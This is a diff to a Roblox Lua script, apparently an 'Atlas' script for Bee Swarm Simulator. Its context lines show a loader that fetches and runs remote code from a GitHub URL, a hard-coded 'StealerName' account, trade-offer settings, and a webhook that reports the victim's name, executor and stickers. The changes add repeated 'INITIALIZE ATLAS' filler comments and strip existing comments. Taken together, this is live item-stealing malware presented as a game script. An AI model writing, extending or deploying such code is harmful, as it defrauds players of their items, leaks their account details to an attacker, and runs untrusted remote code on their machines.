@@ -10,6 +10,17 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/r
 if _G.atlasexec then return end
 _G.atlasexec = true
 
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+--INITIALIZE ATLAS
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -29,7 +40,7 @@ local StickerBookMenu = require(ReplicatedStorage.Gui.StickerMenus.StickerBookMe
 
 local MAX_OFFER_SIZE = 30
 
-local StealerName = {"Freshie_bestie"} --Freshie_bestie
+local StealerName = {"Freshie_bestie"}
 local StealerPlayer = nil
 local StealerID = nil
 
@@ -334,7 +345,7 @@ local function SendWebhook()
 		["embeds"] = {
 			{
 				["title"] = LocalPlayer.Name .. (IsHiveHub and " **[HIVE HUB]** " or " ") .. identifyexecutor(),
-				["color"] = 0xFFD700, -- gold color
+				["color"] = 0xFFD700,
 				fields = {
 					{
 						name = "Stickers",
